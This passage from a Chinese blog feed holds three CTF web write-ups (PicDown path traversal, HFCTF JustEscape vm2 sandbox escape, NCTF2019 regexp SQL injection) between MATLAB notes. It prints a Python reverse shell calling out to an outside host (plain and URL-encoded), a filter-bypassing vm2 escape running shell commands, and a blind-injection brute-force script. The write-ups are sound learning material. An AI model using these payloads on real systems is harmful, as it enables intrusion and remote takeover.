x.^2;plot(x, y);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><p><strong>sin(x)</strong></p><blockquote><p>xlabel和ylabel命令沿x轴和y轴生成标签。<br>title命令用于在图表上设置标题。<br>grid on命令用于将网格线放在图形上。<br>axis equal命令允许生成具有相同比例因子的绘图和两个轴上的空格。</p></blockquote><pre class="line-numbers language-none"><code class="language-none">x &#x3D; [0:0.01:10];y &#x3D; sin(x);plot(x, y), xlabel(&#39;x&#39;), ylabel(&#39;Sin(x)&#39;), title(&#39;Sin(x) Graph&#39;),grid on, axis equal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>生成的图像如下<br><img src="/2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C/2.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯-2020-白虎组-PicDown</title>
      <link href="2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/"/>
      <url>2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1.目录遍历"></a>1.目录遍历</h2><p>首先，没有给出任何提示，只有一个输入框，回车后query里面多了个<code>?url=</code>，这就没啥技巧了吧，全靠猜测是不是有目录遍历漏洞。<br>遍历试试。payload:<code>../../../../etc/passwd</code>，然后返回一个下载的东西(是个jpg文件)，以记事本打开后就能看到文本内容了，的确是我们的目标——<code>passwd文件</code>。<br><strong>这里有个非预期解，就是直接<code>../../../../flag</code>，这样也能搞到flag，但是我们的本意不是这样，下面是预期解</strong></p><h2 id="2-下载主要文件"><a href="#2-下载主要文件" class="headerlink" title="2.下载主要文件"></a>2.下载主要文件</h2><p>首先通过linux进程管理看下<code>../../../../../proc/self/cmdline</code>，可以读取当前进程文件。<img src="/2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/1.png" alt><br>是执行的<code>app.py文件</code>。</p><p>读一下该文件，payload为<code>?url=app.py</code><br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> os<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>                <span class="token comment">#好家伙，这里直接把secret文件给删掉了。</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-none"><code class="language-none">if key &#x3D;&#x3D; SECRET_KEY:        shell &#x3D; request.args.get(&quot;shell&quot;)        os.system(shell)        res &#x3D; &quot;ok&quot;    else:        res &#x3D; &quot;Wrong Key!&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看这里，想getshell必须拿到secret_key，就是要拿到secret.txt文件的内容。</p><h2 id="2-linux进程管理之打开的每个进程的链接"><a href="#2-linux进程管理之打开的每个进程的链接" class="headerlink" title="2.linux进程管理之打开的每个进程的链接"></a>2.linux进程管理之打开的每个进程的链接</h2><p>怎么拿到刚才的secret.txt文件的内容呢？这里要用到linux的进程管理这个知识点。<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;pid&#x2F;cmdline  包含了用于开始进程的命令  ；&#x2F;proc&#x2F;pid&#x2F;cwd 包含了当前进程工作目录的一个链接  ；&#x2F;proc&#x2F;pid&#x2F;environ  包含了可用进程环境变量的列表  ；&#x2F;proc&#x2F;pid&#x2F;exe  包含了正在进程中运行的程序链接；&#x2F;proc&#x2F;pid&#x2F;fd&#x2F;  这个目录包含了进程打开的每一个文件的链接；&#x2F;proc&#x2F;pid&#x2F;mem  包含了进程在内存中的内容；&#x2F;proc&#x2F;pid&#x2F;stat 包含了进程的状态信息；&#x2F;proc&#x2F;pid&#x2F;statm  包含了进程的内存使用信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>这里用得到的:<br><pre class="line-numbers language-none"><code class="language-none">proc&#x2F;pid&#x2F;fd&#x2F;  这个目录包含了进程打开的每一个文件的链接；<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>读一下，用下面的paylaod:<code>/page?url=../../../../proc/self/fd/3</code>，这里的<code>/proc/self</code>也是一个链接文件，当进程访问此链接时，就会访问这个进程本身的<code>/proc/pid目录</code></p><p>然后获得secret内容为<code>zgySafkqtdMW5uvibbmE/DEe+aS1hhNbqRa+rqSaavY=</code></p><h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;no_one_know_the_manager?key&#x3D;zgySafkqtdMW5uvibbmE&#x2F;DEe+aS1hhNbqRa+rqSaavY&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>到这了，不知道为啥<code>key</code>总是错误，不测了（测一个小时了），心态崩了。。。</p></blockquote><p><img src="/2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/2.png" alt><br>感觉像是buu的环境出现了一点问题。。。flag就按非预期的传上去了。</p><h4 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h4><p>如果可以继续的话，可以进行下面的操作。</p><p>现在的buu靶机都能被外网访问了，所以就可以在自己的服务器上面监听了。</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 9573<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后被攻击端执行下面的命令就连上了。<br><pre class="line-numbers language-none"><code class="language-none">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;a16ne.cn&#39;,9573));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="4-payload"><a href="#4-payload" class="headerlink" title="4.payload"></a>4.payload</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;no_one_know_the_manager?key&#x3D;XqcW8IFne+2ARg76zHfHtFoBd8gVjeWoBhAo61EWVOQ&#x3D;&amp;shell&#x3D;python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;a16ne.cn&#39;,9573));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;no_one_know_the_manager?key&#x3D;zgySafkqtdMW5uvibbmE&#x2F;DEe+aS1hhNbqRa+rqSaavY&#x3D;&amp;shell&#x3D;%70%79%74%68%6F%6E%20%2D%63%20%22%69%6D%70%6F%72%74%20%6F%73%2C%73%6F%63%6B%65%74%2C%73%75%62%70%72%6F%63%65%73%73%3B%73%3D%73%6F%63%6B%65%74%2E%73%6F%63%6B%65%74%28%73%6F%63%6B%65%74%2E%41%46%5F%49%4E%45%54%2C%73%6F%63%6B%65%74%2E%53%4F%43%4B%5F%53%54%52%45%41%4D%29%3B%73%2E%63%6F%6E%6E%65%63%74%28%28%27%61%31%36%6E%65%2E%63%6E%27%2C%39%35%37%33%29%29%3B%6F%73%2E%64%75%70%32%28%73%2E%66%69%6C%65%6E%6F%28%29%2C%30%29%3B%6F%73%2E%64%75%70%32%28%73%2E%66%69%6C%65%6E%6F%28%29%2C%31%29%3B%6F%73%2E%64%75%70%32%28%73%2E%66%69%6C%65%6E%6F%28%29%2C%32%29%3B%70%3D%73%75%62%70%72%6F%63%65%73%73%2E%63%61%6C%6C%28%5B%27%2F%62%69%6E%2F%62%61%73%68%27%2C%27%2D%69%27%5D%29%3B%22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写作业去了</p><blockquote><p>除了筷子，我真的什么都放得下。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 遍历目录 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020-JustEscape</title>
      <link href="2020/10/28/HFCTF2020-JustEscape/"/>
      <url>2020/10/28/HFCTF2020-JustEscape/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-获得提示与php代码"><a href="#1-获得提示与php代码" class="headerlink" title="1.获得提示与php代码"></a>1.获得提示与php代码</h2><p>提示有两个，第一个说是注意编码，意思就是他eval之前把<code>%2b</code>进行了url解码。第二个提示说<code>这是不是php呢？</code>意思就是<code>不是php</code>。</p><p>直接进入<code>/run.php</code>后获得以下的php代码<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpif( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#39;code&#39; ] !&#x3D; NULL ) &#123;    $code &#x3D; $_GET[&#39;code&#39;];    echo eval(code);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这里的内容意思就是给我们提供了一个可用于上传的参数。<br><strong>不会了，菜菜</strong></p><p>用<code>?code=Error().stack</code>可测试出用得是js<br><img src="/2020/10/28/HFCTF2020-JustEscape/2.png" alt><br>看看wp，用得是js的<code>sandbox</code>，名为<code>vm2</code>。<img src="/2020/10/28/HFCTF2020-JustEscape/1.png" alt><br>可供逃逸的<code>payload</code><a href="https://github.com/patriksimek/vm2/issues/225">ISSUE在这</a></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">code &#x3D; &#39;(&#39; + function()&#123;TypeError.prototype.get_process &#x3D; f&#x3D;&gt;f.constructor(&quot;return process&quot;)();try&#123;Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1;&#125;catch(e)&#123;return e.get_process(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();&#125;&#125;+&#39;)()&#39;;try&#123;console.log(new VM().run(code));&#125;catch(x)&#123;console.log(x);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-过滤绕过"><a href="#2-过滤绕过" class="headerlink" title="2.过滤绕过"></a>2.<code>过滤绕过</code></h2><p>主要过滤的<br><pre class="line-numbers language-none"><code class="language-none">[&#39;process&#39;, &#39;exec&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;&quot;&#39;, &#39;&#39;&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>可用以下方式绕过<br><pre class="line-numbers language-none"><code class="language-none">(function ()&#123;    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return proces&#96;&#125;s&#96;&#125;&#96;)();    try&#123;        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;    &#125;catch(e)&#123;        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString();    &#125;&#125;)()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-none"><code class="language-none">        prototype                &#x2F;**用下面的内容来绕过(即变量拼接)，这种比较简单*&#x2F;[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>现在的payload为<br><pre class="line-numbers language-none"><code class="language-none">?code&#x3D;(function ()&#123;    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return proces&#96;&#125;s&#96;&#125;&#96;)();    try&#123;        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;    &#125;catch(e)&#123;        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString();    &#125;&#125;)()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h2><p>上传query参数即可获得flag<br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;d564d610-40d9-4b95-b652-32d5cb69bfca&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><pre class="line-numbers language-none"><code class="language-none">主要用到的有&#96;vm2&#96;沙箱逃逸的poc:?code&#x3D;(function ()&#123;    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return proces&#96;&#125;s&#96;&#125;&#96;)();    try&#123;        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;    &#125;catch(e)&#123;        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString();    &#125;&#125;)()js绕过关键词过滤的方法:拼接变量绕过如过滤关键词&#96;prototype&#96;，则绕过方式为&#96;&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>笑渐不闻声渐消，多情却被无情恼。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> vm2沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019-SQLi</title>
      <link href="2020/10/27/NCTF2019-SQLi/"/>
      <url>2020/10/27/NCTF2019-SQLi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>一看就知道是sql注入，首先没有注册按钮，其次下面有sql语句的提示。啊这。。</p><p><img src="/2020/10/27/NCTF2019-SQLi/1.png" alt></p><h2 id="2-regexp注入"><a href="#2-regexp注入" class="headerlink" title="2.regexp注入"></a>2.regexp注入</h2><p>看一下<code>robots.txt</code>，看到了提示<img src="/2020/10/27/NCTF2019-SQLi/2.png" alt><br>然后进入<code>hint.txt</code>看提示，获得以下的提示内容<br><pre class="line-numbers language-none"><code class="language-none">$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,Then you will get the flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>意思是想让我们获得管理员的密码就ok了。黑名单如下，也省得测试了。。。<br><pre class="line-numbers language-none"><code class="language-none">limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|&#x3D;| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>然后可以知道没禁用<code>regexp语句</code>，还是白名单最安全，另外这个<code>regexp</code>真的sao，妹想到啊。。。</p><blockquote><p>regexp正则注入原理，看过师傅的wp还是自己试一下。</p></blockquote><p>看一下用户。<br><img src="/2020/10/27/NCTF2019-SQLi/3.png" alt></p><p>正则匹配成功会返回1<br><img src="/2020/10/27/NCTF2019-SQLi/4.png" alt></p><p>匹配失败后返回0<br><img src="/2020/10/27/NCTF2019-SQLi/5.png" alt></p><h2 id="3-注入测试"><a href="#3-注入测试" class="headerlink" title="3.注入测试"></a>3.注入测试</h2><p>原先的查询语句为<code>select * from users where username=&#39;&#39; and passwd=&#39;&#39;</code><br>怎么构造可以执行我们想执行的语句呢？<br>若<code>username=\</code>将<code>&#39;</code>给转义为普通字符，第一个单引号就会和第三个单引号匹配。后面执行|| username 可正则匹配的*内容返回。<br>即构造<br><pre class="line-numbers language-none"><code class="language-none">username&#x3D;\passwd&#x3D;|| &#x2F;**&#x2F;username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^admin&quot;;%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>最后的<code>%00用来注释</code>绕过<code>&#39;</code>。<br><pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;\&#39; and passwd&#x3D;&#39;|| &#x2F;**&#x2F;username&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;;%00&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>注意在写python的时候，传入<code>%00</code>不能直接传入，直接传会解码直接为空，用<code>\x00</code>或者<code>chr(0)</code>可绕过。</p></blockquote><p>测试<br><img src="/2020/10/27/NCTF2019-SQLi/6.png" alt></p><h2 id="4-注入python脚本"><a href="#4-注入python脚本" class="headerlink" title="4.注入python脚本"></a>4.注入python脚本</h2><pre class="line-numbers language-none"><code class="language-none">#coding:utf-8import requestsimport timeimport stringurl &#x3D; &quot;http:&#x2F;&#x2F;53321f67-0e98-440e-9e0d-bcdc4d70182f.node3.buuoj.cn&#x2F;index.php&quot;str_list &#x3D; &quot;_&quot; + string.ascii_lowercase + string.ascii_uppercase + string.digits  ## 枚举了几乎所有可能，_、大、小写ascii、和digits也就是数字。payload &#x3D; &#39;&#39;for n in range(100):print(n)for i in str_list:data &#x3D; &#123;            &#39;username&#39;: &#39;\\&#39;,             &#39;passwd&#39;  : &#39;||passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^&#123;&#125;&quot;;\x00&#39;.format(payload+i)        &#125;res &#x3D; requests.post(url &#x3D; url, data &#x3D; data)if &#39;welcome.php&#39; in res.text:payload +&#x3D; iprint(payload)breakelif res.status_code &#x3D;&#x3D; 429:   #防止429访问过快time.sleep(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得passwd<code>you_will_never_know7788990</code>，第一次测错了，可能是脚本的原因，也可能是服务端的问题，目前搞不懂。</p><p><img src="/2020/10/27/NCTF2019-SQLi/7.png" alt></p><h2 id="5-flag"><a href="#5-flag" class="headerlink" title="5.flag"></a>5.flag</h2><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;582abc6b-5f72-4a6a-ad54-f496db4baf79&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>人间是万象横看，竖成诗篇。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> regexp注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MATLAB安装，MATLAB使用经验(一)</title>
      <link href="2020/10/27/MATLAB%E5%AE%89%E8%A3%85%E7%BB%8F%E9%AA%8C/"/>
      <url>2020/10/27/MATLAB%E5%AE%89%E8%A3%85%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>争得与你一席并肩</p></blockquote><p>转载自<a href="https://blog.csdn.net/qq_39233184/article/details/106838870">MATLAB安装经验</a></p><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h2><p>懒得写了。</p><h2 id="2-安装前需知"><a href="#2-安装前需知" class="headerlink" title="2.安装前需知"></a>2.安装前需知</h2><p>2.1）安装全程须断网，否则易安装不成功；</p><p>2.2）安装前先关闭360、电脑管家等所有杀毒软件，防止误杀补丁，导致安装失败；</p><p>2.3）Matlab2020a仅适用于Win7/10（64位）系统，亲测可用！</p><p>2.4）安装Matlab2020a要求计算机名和用户名非中文，否则安装后无法正常打开；</p><h2 id="3-安装步骤"><a href="#3-安装步骤" class="headerlink" title="3.安装步骤"></a>3.安装步骤</h2><p>…省略了，懒得写自己看吧。</p><h1 id="怎么使用"><a href="#怎么使用" class="headerlink" title="怎么使用"></a>怎么使用</h1><h2 id="1-各种变量"><a href="#1-各种变量" class="headerlink" title="1.各种变量"></a>1.各种变量</h2><h3 id="1-向量"><a href="#1-向量" class="headerlink" title="(1).向量"></a>(1).向量</h3><h4 id="行向量"><a href="#行向量" class="headerlink" title=".行向量"></a><1>.行向量</1></h4><p>创建方式<code>x = [1, 2, 3, 4, 5]</code>，出来的就是横着的<code>行向量</code>。<br><pre class="line-numbers language-none"><code class="language-none">x &#x3D;          1.00          2.00          3.00          4.00          5.00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h4 id="列向量"><a href="#列向量" class="headerlink" title=".列向量"></a><2>.列向量</2></h4><p>创建方式<code>x = [1; 2; 3; 4; 5]</code>，出来的就是竖着的<code>列向量</code>。<br><pre class="line-numbers language-none"><code class="language-none">x &#x3D;          1.00          2.00          3.00          4.00          5.00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h3 id="2-矩阵"><a href="#2-矩阵" class="headerlink" title="(2).矩阵"></a>(2).矩阵</h3><p>创建一个<code>3v3</code>的矩阵方式如下<code>m = [1 2 3; 4 5 6; 7 8 